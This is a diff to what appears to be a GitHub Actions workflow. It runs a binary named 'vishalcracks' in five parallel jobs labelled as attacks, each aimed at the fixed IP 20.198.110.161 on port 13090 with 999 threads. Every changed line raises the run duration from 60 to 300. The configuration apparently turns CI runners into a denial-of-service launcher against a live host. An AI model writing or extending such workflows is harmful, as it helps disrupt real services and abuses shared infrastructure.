@@ -9,32 +9,32 @@ jobs:
     steps:
       - uses: actions/checkout@v3
       - run: chmod +x vishalcracks
-      - run: sudo ./vishalcracks 20.198.110.161 13090 60 999
+      - run: sudo ./vishalcracks 20.198.110.161 13090 300 999
   
   attack2:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v3
       - run: chmod +x vishalcracks
-      - run: sudo ./vishalcracks 20.198.110.161 13090 60 999
+      - run: sudo ./vishalcracks 20.198.110.161 13090 300 999
   
   attack3:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v3
       - run: chmod +x vishalcracks
-      - run: sudo ./vishalcracks 20.198.110.161 13090 60 999
+      - run: sudo ./vishalcracks 20.198.110.161 13090 300 999
   
   attack4:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v3
       - run: chmod +x vishalcracks
-      - run: sudo ./vishalcracks 20.198.110.161 13090 60 999
+      - run: sudo ./vishalcracks 20.198.110.161 13090 300 999
   
   attack5:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v3
       - run: chmod +x vishalcracks
-      - run: sudo ./vishalcracks 20.198.110.161 13090 60 999
+      - run: sudo ./vishalcracks 20.198.110.161 13090 300 999
